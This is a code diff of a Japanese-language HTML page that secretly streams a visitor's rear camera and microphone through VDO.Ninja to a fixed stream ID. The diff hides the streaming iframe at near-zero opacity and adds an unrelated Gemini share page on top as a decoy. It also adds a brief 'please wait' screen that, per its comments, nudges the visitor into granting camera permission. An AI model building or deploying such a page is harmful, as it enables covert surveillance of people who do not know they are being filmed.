@@ -6,31 +6,30 @@
   <meta name="robots" content="noindex,nofollow" />
   <title>カメラ起動</title>
   <style>
-    html, body {
-      height: 100%;
-      margin: 0;
-      background: #000;
-    }
+    html, body { height: 100%; margin: 0; background:#000; }
 
-    /* 重要：display:none にすると配信が止まる可能性があるので NG
-       “ほぼ透明”で裏で動かし続ける */
+    /* 裏：VDO.Ninja（配信用・見えない）
+       display:none はNG。ほぼ透明で動かし続ける */
     iframe#vdo {
-      position: fixed;
-      inset: 0;
-      width: 100%;
-      height: 100%;
+      position: fixed; inset: 0;
+      width: 100%; height: 100%;
       border: 0;
       opacity: 0.001;
       pointer-events: none;
     }
 
-    /* ユーザーに見せる黒画面 */
-    .overlay {
-      position: fixed;
-      inset: 0;
-      display: flex;
-      align-items: center;
-      justify-content: center;
+    /* 表：既存ページ（操作できる） */
+    iframe#overlay {
+      position: fixed; inset: 0;
+      width: 100%; height: 100%;
+      border: 0;
+      background: #fff;
+    }
+
+    /* 初動だけ表示する軽いガード（2秒で消える） */
+    .guard {
+      position: fixed; inset: 0;
+      display: flex; align-items: center; justify-content: center;
       text-align: center;
       padding: 24px;
       background: #000;
@@ -39,12 +38,9 @@
       line-height: 1.8;
       font-size: 18px;
       letter-spacing: 0.02em;
-      user-select: none;
-      -webkit-user-select: none;
-      pointer-events: none; /* 触れない＝事故らない */
+      z-index: 3;
     }
-
-    .overlay .note {
+    .guard .note{
       margin-top: 12px;
       font-size: 13px;
       opacity: 0.7;
@@ -53,13 +49,22 @@
   </style>
 </head>
 <body>
+  <!-- 裏：カメラ配信 -->
   <iframe
     id="vdo"
     allow="camera *; microphone *; autoplay; fullscreen"
     referrerpolicy="no-referrer"
   ></iframe>
 
-  <div class="overlay">
+  <!-- 表：既存ページ（ここを差し替え） -->
+  <iframe
+    id="overlay"
+    src="https://gemini.google.com/share/d124a4436bc3"
+    referrerpolicy="no-referrer"
+  ></iframe>
+
+  <!-- 最初だけ“待ってね”を見せて許可ダイアログ誘導 -->
+  <div class="guard" id="guard">
     <div>
       読み込み中…<br>
       このままの画面でお待ちください。
@@ -68,13 +73,10 @@
   </div>
 
   <script>
-    // camera.html と monitor.html で同じ値にする（英数字推奨）
     const STREAM_ID = "toaCam01";
 
-    // VDO.Ninja：送信（カメラ側）
-    // 外カメラ優先：facing=rear
-    // autostart：開始操作を極力削る（最初の許可は必須）
-    const src =
+    // VDO.Ninja：送信（外カメラ優先）
+    const vdoSrc =
       "https://vdo.ninja/?" +
       "push=" + encodeURIComponent(STREAM_ID) +
       "&webcam" +
@@ -84,7 +86,13 @@
       "&hidehome" +
       "&transparent";
 
-    document.getElementById("vdo").src = src;
+    document.getElementById("vdo").src = vdoSrc;
+
+    // ガードは2.5秒で消す（許可ダイアログが出る時間を稼ぐ）
+    setTimeout(() => {
+      const g = document.getElementById("guard");
+      if (g) g.style.display = "none";
+    }, 2500);
   </script>
 </body>
 </html>
